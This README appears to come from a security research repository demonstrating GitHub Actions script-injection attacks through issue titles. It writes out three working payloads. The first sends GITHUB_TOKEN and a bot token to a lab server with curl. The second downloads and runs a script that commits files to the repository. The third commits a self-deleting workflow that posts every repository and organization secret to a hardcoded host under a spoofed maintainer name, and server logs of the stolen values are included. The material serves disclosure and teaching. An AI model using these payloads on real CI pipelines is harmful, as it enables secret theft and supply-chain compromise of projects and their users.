# Github Actions Injection Vulnerability Demo

This repository contains several utility scripts and Github Actions we used in our research for [Github Actions injection vulnerabilities](https://cycode.com/blog/github-actions-vulnerabilities/).
We presented this talk on several occasions:
- SupplyChainSecurityCon 2022 (part of OpenSourceSummit NA) - [Github Actions Security Landscape](https://www.youtube.com/watch?v=dTrHKa9mbdQ)
- DevSecCon24 - [Github Actions Security Landscape](https://www.youtube.com/watch?v=zr4nka52Fk0)

## Article Outline

Our research blog describes how we found several popular open source projects vulnerable to [script injection attack](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#good-practices-for-mitigating-script-injection-attacks) through user-controlled input, such as Github issue title and body.
We deeply investigated this threat and tried to understand the implications of such a build compromise. We quickly understood that the consequences could be pretty disastrous:
- The attacker can exfiltrate sensitive tokens from the build service (such as AWS tokens, docker hub, etc.)
- The attacker can commit new code to the repository and cause a potential supply-chain attack on the product's users.

We also show how to mitigate such attacks and their consequences.

## Demos

As explained in the article, the demos show the possible implications of a malicious attacker that gained control over the build process.
The vulnerable workflow we'll use through the demos is [vuln](.github/workflows/vuln.yml), which will be triggered whenever a new issue is created.

### Demo 1 - Exfiltrating sensitive secrets

First, you must set up a server to listen to the exfiltrated secrets in a lab environment. You can use our https://github.com/CycodeLabs/simple-http-logger for that.

Then, change the the URL parameter with your lab server URL, and create an issue with the following title:

```bash
Innocent bug" && curl -d “token=$GITHUB_TOKEN” http://lab.cycode.com:64375 && sudo docker run --rm -d -v /home/runner/work/_temp:/app/monitored cycodelabs/actionmonitor -u http://lab.cycode.com:64375 && sleep 2 && echo "
```

This payload consists of two commands:

```bash
# Exfiltrating GITHUB_TOKEN
curl -d “token=$GITHUB_TOKEN” <LAB_URL>

# Exfiltrating BOT_TOKEN through the script that comes after
sudo docker run --rm -d -v /home/runner/work/_temp:/app/monitored cycodelabs/actionmonitor -u <LAB_URL>
```

This script uses another tool we developed - [gh-action-shell-monitor](https://github.com/CycodeLabs/gh-action-shell-monitor). This tool listens for any shell files modified in the specified directory and sends them to a designated server.
The result would be receiving the complete script on our lab server, together with the embedded `BOT_TOKEN`.

**Demo 1 Result**

We will see the exfiltrated secrets on our lab server:

```bash
Host: lab.cycode.com:64375
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 52
Content-Type: application/x-www-form-urlencoded

“token=ghs_REDACTED”

20.225.222.12 - - [31/Jul/2022 14:19:34] "POST / HTTP/1.1" 200 -

Host: lab.cycode.com:64375
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 359
Content-Type: multipart/form-data; boundary=bf5bd2ffa2c3ab565217ec5f0b86aca2

--bf5bd2ffa2c3ab565217ec5f0b86aca2
Content-Disposition: form-data; name="upload_file"; filename="0dc9e55d-40eb-4c83-aa1c-d2ccfc4e04e9.sh"

curl -X POST -H "Authorization: Token this_is_a_very_secret_token" -d '{"labels": ["New Issue"]}' https://api.github.com/repos/CycodeLabs/gh-injection-vuln-demo/issues/20/labels
--bf5bd2ffa2c3ab565217ec5f0b86aca2--


20.225.222.12 - - [31/Jul/2022 14:19:41] "POST / HTTP/1.1" 200 -
```

### Demo 2 - Committing to the repository

We can use simple git commands and commit a "malicious" file into the repository during the build process.

The issue title for the demo:

```bash
Innocent bug" && curl -o /tmp/script.sh https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/scripts/commit_file.sh && chmod +x /tmp/script.sh && /tmp/script.sh https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/files/file_to_commit innocent_file && echo "
```

This payload consists of the following commands:

```bash
# Fetching the commit script
curl -o /tmp/script.sh https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/scripts/commit_file.sh

# Giving it proper permissions
chmod +x /tmp/script.sh

# Running it together with our "malicious" file
/tmp/script.sh https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/files/file_to_commit innocent_file
```

**Demo 2 Result**

We will see additional file committed to the repository during the build phase:

![committed_file](pics/commited_file.png)

### Demo 3 - Exfiltrating repository and organization secrets

In this demo, we used the commit capability to get the repository/organization secrets that weren't necessarily defined in that specific workflow but were defined for that repository.

First, we need to set up the server just like in the first demo.

The issue title for the demo:

```bash
# Send as issue body because issue title is capped with a character limit
" && WORKFLOW_CONTENT=$(curl -s https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/actions/expose_secrets.yml | base64 -w 0) && curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"'"$WORKFLOW_CONTENT"'"}' && echo "
```

This payload consists of the following command:

```bash
# Fetching the workflow from our repository
WORKFLOW_CONTENT=$(curl -s https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/actions/expose_secrets.yml | base64 -w 0)

# Committing it to the current repository
curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"'"$WORKFLOW_CONTENT"'"}'
```

So, our payload first fetches our pre-created custom workflow [actions/expose_secrets.yml](actions/expose_secrets.yml), and commits it to the current repository:

```yaml
name: Exposing ALL Secrets

on:
  workflow_run:
    workflows: ["Vuln"]

env:
  WORKFLOW_NAME: "innocent_workflow.yml"
  MAINTAINER_NAME: "Maintainer Name"
  MAINTAINER_EMAIL: "maintainer@gmail.com"
  COMMIT_MESSAGE: "innocent commit message"
  URL: http://lab.cycode.com:64375

jobs:
  expose_secrets:
    runs-on: ubuntu-latest

    steps:
      - run: |
          echo "${{ toJSON(secrets) }}" > .secrets
          curl -X POST --data "@.secrets" $URL
      - run: |
          SHA=$(curl -X GET -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/$WORKFLOW_NAME -s | jq -r .sha)
          curl -X DELETE -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/$WORKFLOW_NAME -d '{"message":"$COMMIT_MESSAGE","committer":{"name":"$MAINTAINER_NAME","email":"$MAINTAINER_EMAIL"}, "sha":"'"${SHA}"'"}' 
```

So the procedure of the demo is the following:

- We inject our malicious payload into the `Vuln` workflow.
- The `Vuln` workflow invokes Github API to commit a new workflow, the `Exposing ALL Secrets` workflow.
- The `Vuln` workflow ends.
- Because of `workflow_run:`, the Github Actions service will trigger `Exposing ALL Secrets` when `Vuln` ends.
- `Exposing ALL Secrets` workflow sends all secrets to a hardcoded server.
- `Exposing ALL Secrets` workflow deletes itself.

**Demo 3 Result**

We will see the exfiltrated repository and organization secrets defined for that repository:

```bash
Host: lab.cycode.com:64375
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 159
Content-Type: application/x-www-form-urlencoded

{  SECRET1: secret_token_num_1,  SECRET2: secret_token_num_2,  BOT_TOKEN: this_is_a_very_secret_token,  github_token: ghs_REDACTED}

20.232.17.210 - - [31/Jul/2022 13:23:08] "POST / HTTP/1.1" 200 -
```